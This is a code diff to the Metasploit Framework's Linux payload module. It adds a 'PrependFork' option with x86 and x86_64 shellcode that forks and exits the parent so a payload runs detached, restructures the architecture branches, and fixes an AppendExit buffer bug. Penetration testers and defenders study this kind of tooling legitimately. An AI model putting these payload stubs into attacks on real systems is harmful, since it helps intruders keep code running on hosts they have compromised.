@@ -19,6 +19,13 @@ module Msf::Payload::Linux
 
     register_advanced_options(
       [
+        Msf::OptBool.new('PrependFork',
+          [
+            false,
+            "Prepend a stub that executes: if (fork()) { exit(0); }",
+            "false"
+          ]
+        ),
         Msf::OptBool.new('PrependSetresuid',
           [
             false,
@@ -96,6 +103,17 @@ module Msf::Payload::Linux
     if (test_arch.include?(ARCH_X86))
 
       # Prepend
+
+      if (datastore['PrependFork'])
+        pre << "\x6a\x02"             +#   pushb   $0x2                       #
+               "\x58"                 +#   popl    %eax                       #
+               "\xcd\x80"             +#   int     $0x80       ; fork         #
+               "\x85\xc0"             +#   test    %eax,%eax                  #
+               "\x74\x06"             +#   jz      0xf                        #
+               "\x31\xc0"             +#   xor     %eax,%eax                  #
+               "\xb0\x01"             +#   movb    $0x1,%al    ; exit         #
+               "\xcd\x80"              #   int     $0x80                      #
+      end
 
       if (datastore['PrependSetresuid'])
         # setresuid(0, 0, 0)
@@ -197,10 +215,8 @@ module Msf::Payload::Linux
           "\xcd\x80"              #   int     $0x80                      #
       end
 
-    end
-
     # Handle all Power/CBEA code here
-    if (test_arch.include?([ ARCH_PPC, ARCH_PPC64, ARCH_CBEA, ARCH_CBEA64 ]))
+    elsif (test_arch.include?([ ARCH_PPC, ARCH_PPC64, ARCH_CBEA, ARCH_CBEA64 ]))
 
       # Prepend
 
@@ -277,9 +293,21 @@ module Msf::Payload::Linux
                "\x38\x1f\xfe\x02"     +#   addi    r0,r31,-510                #
                "\x44\xff\xff\x02"      #   sc                                 #
       end
-                end
 
-    if (test_arch.include?(ARCH_X86_64))
+    elsif (test_arch.include?(ARCH_X86_64))
+
+      if (datastore['PrependFork'])
+        # if (fork()) { exit(0); }
+        pre << "\x6a\x39"             #    push    57        ; __NR_fork     #
+        pre << "\x58"                 #    pop     rax                       #
+        pre << "\x0f\x05"             #    syscall                           #
+        pre << "\x48\x85\xc0"         #    test    rax,rax                   #
+        pre << "\x74\x08"             #    jz      0x08                      #
+        pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+        pre << "\x6a\x3c"             #    push    60        ; __NR_exit     #
+        pre << "\x58"                 #    pop     rax                       #
+        pre << "\x0f\x05"             #    syscall                           #
+      end
 
       if (datastore['PrependSetresuid'])
         # setresuid(0, 0, 0)
@@ -389,8 +417,8 @@ module Msf::Payload::Linux
       # Append exit(0)
       if (datastore['AppendExit'])
         app << "\x48\x31\xff"         #    xor     rdi,rdi                   #
-        pre << "\x6a\x3c"             #    push    0x53                      #
-        pre << "\x58"                 #    pop     rax                       #
+        app << "\x6a\x3c"             #    push    0x3c                      #
+        app << "\x58"                 #    pop     rax                       #
         app << "\x0f\x05"             #    syscall                           #
       end
     end
